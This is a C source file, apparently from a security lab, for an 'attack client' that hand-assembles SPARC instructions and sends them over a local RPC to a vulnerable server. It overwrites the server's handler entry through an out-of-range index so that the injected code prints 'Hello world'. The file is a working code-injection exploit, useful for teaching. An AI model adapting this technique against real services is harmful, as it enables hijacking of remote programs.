/*
 * Attack Client:
 *
 * This program is a simple client that by injecting assembly
 * instructions into the server's buffer and changing its state will
 * print out "Hello world to the server's standard output.
 * 
 * Precondition: this client must be run as follows: 
 *   net_redir -s 5141@localhost -d 3 -- attack
 * Postcondition: string "Hello world" is printed on the server's
 *                standard output.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "rpc.h"
int o0      = 0x8;     //%o0 encoding--the 8th register
int o1      = 0x9;     //%01 encoding--the 9th register
int padding = 0xFFFFFFFF;     //padding, could have been anything
int sethi   = (0x010 << 20);  //format: 00rd100imm22
int straddrH= (0x24294 >> 10);  // we shift it to the right by 10 to
				// get the top 22bits
int straddrL= (0x24294 & 0x3ff);// we & with 0x3ff to mask off the
				// lower 10 bits
int or      = (0x80102000);   //format: 10rd000010rs1imm13
int printfaddr = 0x23fc4;     //address of printf in the binary
int pfcalladdr = 0x24284;     //address of the call to printf(our injected code) in state->inbuf
int codeaddr= 0x2427c;        /*where to jump to(address of the first instruction(sethi) in our
				injected code; this is entry->rpc_hndler
			      */
int nop     = 0x01000000;     //duh, nop
int ret = 0x81c7e008;          
int restore = 0x81e80000;
char attackmessage[] = "Hello world\n";     //attack string, message
                                            //to print on the server's standard output
#define VIRUS_OFFSET  136 /*1084+4 congruent to 8(size of an
			    entry_pt), this is the index in
			    state->entry_pts that corresponds to our
			    entry
			  */

int main(int    ac,
         char   **av)
{
        struct srss_state       state;
	//creating sethi instruction out of the given address and dest. register
        int sethiinst = sethi | (o0 << 25) | straddrH;   
	//creating the or instruction out of the given registers and
	//the given address(%lo(hello world string label))
        int orinst  = or | (o0 << 25) | (o0 << 14) | straddrL;
        //creating the call to printf instruction from the address of
	//printf in the binary and the address of where it is called
	//we calculate the pc relative address of printf
	int callpf  = (((printfaddr-pfcalladdr) >> 2) & 0x3FFFFFFF) | 0x40000000;
        srss_client_init(&state,3);  //initialize the client state
        //mashalling the given padding, instruction and attack string
        srss_marshall(&state,"ddddddddds",padding,padding,codeaddr,sethiinst,orinst,callpf,nop,ret,restore,attackmessage);
        //until successfully sent, try the rpc mechanism to send the
	//contents of state->in_buf to the server
	srss_rpc(&state,VIRUS_OFFSET);
        
        return 0;
}


